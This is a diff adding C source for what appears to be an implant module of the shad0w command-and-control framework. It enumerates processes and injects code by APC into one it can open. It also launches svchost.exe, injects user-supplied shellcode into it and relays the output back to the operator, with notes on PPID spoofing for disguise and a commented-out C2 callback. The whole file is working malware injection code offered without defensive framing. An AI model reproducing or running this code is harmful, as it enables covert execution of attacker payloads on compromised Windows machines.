@@ -1,0 +1,405 @@
+typedef struct _STARTUPINFOEXA {
+  STARTUPINFOA                 StartupInfo;
+  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
+} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
+
+/*
+Process:
+
+    - spawn and ppid spoof svchost.exe
+    - redirect io from spawned proc to ?
+    - package and send this back to shad0w
+
+so its not possible to spoof ppid and redirect io? cause it dont work if i use EXTENDED_STARTUPINFO_PRESENT
+*/
+/******************************************************************************************************
+// find a process to ppid spoof
+hProcess = FindProcess(NULL);
+
+// setup the ppid spoofing startup info
+ZeroMemory(&sInfo, sizeof(STARTUPINFOEXA));
+ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
+InitializeProcThreadAttributeList(NULL, 1, 0, &SizeT);
+sInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, SizeT);
+InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &SizeT);
+UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, 0x00020000, &hProcess, sizeof(HANDLE), NULL, NULL);
+
+// redirect the stdout & stderr to the output pipe
+sInfo.StartupInfo.cb = sizeof(STARTUPINFO);
+sInfo.StartupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+sInfo.StartupInfo.hStdError = GetStdHandle(STD_ERROR_HANDLE);
+sInfo.StartupInfo.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
+sInfo.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
+******************************************************************************************************/
+
+    // STARTUPINFO sInfo;
+    // PROCESS_INFORMATION pInfo;
+    // SECURITY_ATTRIBUTES saAttr;
+
+    // HANDLE HandleStdoutWrite = NULL;
+    // HANDLE HandleStdoutRead  = NULL;
+    // HANDLE HandleStinputWrite = NULL;
+
+    // ZeroMemory(&sInfo, sizeof(STARTUPINFO));
+
+    // // tell the startup info to redirect our output
+    // sInfo.cb = sizeof(STARTUPINFO);
+    // sInfo.hStdError = HandleStdoutWrite;
+    // sInfo.hStdOutput = HandleStdoutWrite;
+    // sInfo.hStdInput = NULL;
+    // sInfo.dwFlags = STARTF_USESTDHANDLES;
+
+    // // make sure that the pipe will inherite there handles
+    // saAttr.bInheritHandle = TRUE;
+    // saAttr.lpSecurityDescriptor = NULL; 
+    // saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+
+    // // create the pipe to get stdout & stderr
+    // if (!CreatePipe(&HandleStdoutRead, &sInfo.hStdOutput, &saAttr, 0))
+    // {
+    //     DEBUG("CreatePipe failed");
+    // }
+
+    // start thread to monitor output from the process without blocking the main thread
+    // tHandle = CreateThread(NULL, 0, ReadProcOut, HandleStdoutRead, 0, &threadId);
+
+    // increment the out buffer count
+    // ++StructNum;
+    // DEBUG("thread started");
+
+    // BOOL WINAPI ReadProcOut(LPVOID ProcRead)
+// {
+//     DWORD dwRead;
+//     DWORD rOpCode;
+//     CHAR stdBuf[5000];
+//     BOOL Status = TRUE;
+//     BOOL bSuccess = FALSE;
+
+//     DEBUG("inside thread");
+
+//     while (TRUE)
+//     {
+//         bSuccess = ReadFile((HANDLE)ProcRead, (LPVOID)stdBuf, 1000, &dwRead, NULL);
+
+//         if (!bSuccess)
+//         {
+//             DEBUG("ReadFile failed");
+//             Status = FALSE;
+//             break;
+//         }
+        
+//         if (dwRead != 0)
+//         {
+//             printf("%s\n", stdBuf);
+//             // BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, (char*)stdBuf, 0x2000, dwRead);
+//         }
+
+//         memset(stdBuf, '\0', 5000);
+//         dwRead = 0;
+//     }
+
+//     DEBUG("put it here");
+
+//     return Status;
+    
+// }
+
+    // STARTUPINFO sInfo;
+    // PROCESS_INFORMATION pInfo;
+    // SECURITY_ATTRIBUTES saAttr;
+
+    // HANDLE HandleStdoutWrite = NULL;
+    // HANDLE HandleStdoutRead  = NULL;
+    // HANDLE HandleStinputWrite = NULL;
+
+    // ZeroMemory(&sInfo, sizeof(STARTUPINFO));
+
+    // // tell the startup info to redirect our output
+    // sInfo.cb = sizeof(STARTUPINFO);
+    // sInfo.hStdError = HandleStdoutWrite;
+    // sInfo.hStdOutput = HandleStdoutWrite;
+    // sInfo.hStdInput = NULL;
+    // sInfo.dwFlags = STARTF_USESTDHANDLES;
+
+    // // make sure that the pipe will inherite there handles
+    // saAttr.bInheritHandle = TRUE;
+    // saAttr.lpSecurityDescriptor = NULL; 
+    // saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+
+    // // create the pipe to get stdout & stderr
+    // if (!CreatePipe(&HandleStdoutRead, &sInfo.hStdOutput, &saAttr, 0))
+    // {
+    //     DEBUG("CreatePipe failed");
+    // }
+
+    // start thread to monitor output from the process without blocking the main thread
+    // tHandle = CreateThread(NULL, 0, ReadProcOut, HandleStdoutRead, 0, &threadId);
+
+    // increment the out buffer count
+    // ++StructNum;
+    // DEBUG("thread started");
+
+    #define WIN32_LEAN_AND_MEAN
+
+// kinda important 
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <lmcons.h>
+#include <windows.h>
+#include <winbase.h>
+#include <wtsapi32.h>
+#include <tlhelp32.h>
+#include <processthreadsapi.h>
+
+// our local stuff
+
+#include "settings.h"
+#include "loader.h"
+
+#define MAX_OUTPUT 1000
+SYSTEMTIME start_time, current_time;
+
+// find a process that is suitable to inject into
+HANDLE FindProcess(const char* process)
+{   
+    DWORD PID               = 0;
+    HANDLE hProcess         = NULL;
+    DWORD dwProcCount       = 0;
+    WTS_PROCESS_INFO* pWPIs = NULL;
+
+    if(!WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
+    {
+        // error meaning we wont be able to get the processes
+        printf("WTSEnumerateProcesses fail\n");
+        return -1;
+    }
+
+    for(DWORD i = 0; i < dwProcCount; i++)
+    {
+        // check to see if we can infact open the process
+        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pWPIs[i].ProcessId);
+
+        if (hProcess)
+        {
+            // if we can use the process, check it aint us an if it aint return the pid to the injector
+            if ((GetCurrentProcessId() != pWPIs[i].ProcessId) && (pWPIs[i].ProcessId != 0))
+            {
+                // free up the memory
+                WTSFreeMemory(pWPIs);
+                pWPIs = NULL;
+
+                // return the pid to the injector
+                return hProcess;
+            }
+        }
+        
+    }
+    // went through the loop and never got a pid :-(
+    return -1;
+}
+
+BOOL InjectModule(CHAR* Bytes, DWORD Size)
+{
+    PVOID rBuffer;
+    HANDLE hProcess;
+
+    // get a handle on a process
+    hProcess = FindProcess(NULL);
+
+    printf("Injecting into pid: %d\n", GetProcessId(hProcess));
+
+    rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+    DWORD threadId = 0;
+	THREADENTRY32 threadEntry;
+	threadEntry.dwSize = sizeof(THREADENTRY32);
+
+    BOOL bResult = Thread32First(hSnapshot, &threadEntry);
+	while (bResult)
+	{
+		bResult = Thread32Next(hSnapshot, &threadEntry);
+		if (bResult)
+		{
+			if (threadEntry.th32OwnerProcessID == GetProcessId(hProcess))
+			{
+				threadId = threadEntry.th32ThreadID;
+				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
+                DWORD dwResult = QueueUserAPC((PAPCFUNC)rBuffer, hThread, NULL);
+                CloseHandle(hThread);
+			}
+		}
+	}
+
+	CloseHandle(hSnapshot);
+	CloseHandle(hProcess);
+
+    if (threadId == 0)
+    {
+        // this means that we couldnt find a thread to inject into
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+
+
+BOOL WINAPI ReadFromPipe(HANDLE g_hChildStd_OUT_Rd) 
+{ 
+    DWORD dwRead, rOpCode;
+    char chBuf[MAX_OUTPUT + 1];
+
+    DEBUG("inside read thread");
+   
+    do {
+        // set the current timestamp
+        GetLocalTime(&start_time);
+
+        // read the data from the pipe
+        ReadFile( g_hChildStd_OUT_Rd, chBuf, MAX_OUTPUT, &dwRead, NULL);
+        
+        // send the data to shad0w
+        printf("%s\n", chBuf);
+        // BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, (char*)chBuf, 0x2000, dwRead);
+        
+        // clean up the old buffer
+        memset(chBuf, '\0', sizeof(chBuf));
+   } while (TRUE);
+   
+   return TRUE;
+}
+
+BOOL WINAPI ProcessWatch(HANDLE pHandle)
+{
+    while (TRUE)
+    {
+        // check if there has been any output read yet
+        if (start_time.wSecond != 0)
+        {
+            // if no data has been read in the last 5 seconds
+            GetLocalTime(&current_time);
+            if ((current_time.wSecond - start_time.wSecond) >= 5)
+            {
+                // kill the idle process
+                TerminateProcess(pHandle, 1);
+
+                // report and return from thread
+                DEBUG("killed idle process's");
+                return TRUE;
+            }
+            
+        }
+    }
+    
+}
+
+BOOL InjectUserCode(CHAR* Bytes, DWORD Size)
+{
+    /*
+    Run user supplied code and send all the output back to them
+    */
+
+    DWORD threadId;
+    HANDLE tHandle;
+    HANDLE hProcess;
+    STARTUPINFO sInfo;
+    BOOL bSuccess = FALSE;
+    PROCESS_INFORMATION pInfo;
+    SECURITY_ATTRIBUTES saAttr;
+
+    saAttr.bInheritHandle = TRUE; 
+    saAttr.lpSecurityDescriptor = NULL; 
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+
+    HANDLE g_hChildStd_IN_Rd  = NULL;
+    HANDLE g_hChildStd_IN_Wr  = NULL;
+    HANDLE g_hChildStd_OUT_Rd = NULL;
+    HANDLE g_hChildStd_OUT_Wr = NULL;
+
+    ZeroMemory(&sInfo, sizeof(STARTUPINFO));
+    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
+
+    sInfo.cb         = sizeof(STARTUPINFO); 
+    sInfo.hStdError  = g_hChildStd_OUT_Wr;
+    sInfo.hStdOutput = g_hChildStd_OUT_Wr;
+    sInfo.hStdInput  = g_hChildStd_IN_Rd;
+    sInfo.dwFlags   |= STARTF_USESTDHANDLES;
+ 
+ 
+    // create a pipe to get the process's stdout 
+    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
+    {
+        DEBUG("ERROR: StdoutRd CreatePipe");
+    } 
+
+    // ensure the read handle to the pipe for stdout is not inherited.
+    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
+    {
+        DEBUG("ERROR: Stdout SetHandleInformation");
+    }
+
+    // create a pipe for the child process's stdout. 
+    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
+    {
+        DEBUG("ERROR: Stdin CreatePipe");
+    }
+
+    // ensure the write handle to the pipe for stdin is not inherited. 
+    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
+    {
+        DEBUG("ERROR: Stdin SetHandleInformation");
+    }
+
+    // start the thread to send the output to shad0w
+    CreateThread(NULL, 0, ReadFromPipe, g_hChildStd_OUT_Rd, 0, &threadId);
+
+    // spawn svchost.exe with a different ppid an jus start it running
+    CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
+
+    // alloc and write the code to the process
+    PVOID rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
+    
+    // execute the code inside the process
+    QueueUserAPC((PAPCFUNC)rBuffer, pInfo.hThread, NULL);
+
+    // start the thread which will kill idle process's
+    CreateThread(NULL, 0, ProcessWatch, pInfo.hProcess, 0, &threadId);
+
+    // zero out the shellcode bytes
+    ZeroMemory(Bytes, Size);
+
+    return TRUE;
+}
+
+BOOL ExecuteMemory(char* Bytes, size_t Size, BOOL Module)
+{
+    do
+    {
+        // select the correct way the code needs to be ran
+        switch (Module)
+        {
+        case TRUE:
+            // execute module
+            InjectModule(Bytes, Size);
+            break;
+        
+        case FALSE:
+            // execute arbitary user code
+            InjectUserCode(Bytes, Size);
+        
+        default:
+            break;
+        }
+
+        DEBUG("code should have run");
+        break;
+
+    } while (TRUE);
+
+    return TRUE;
+}
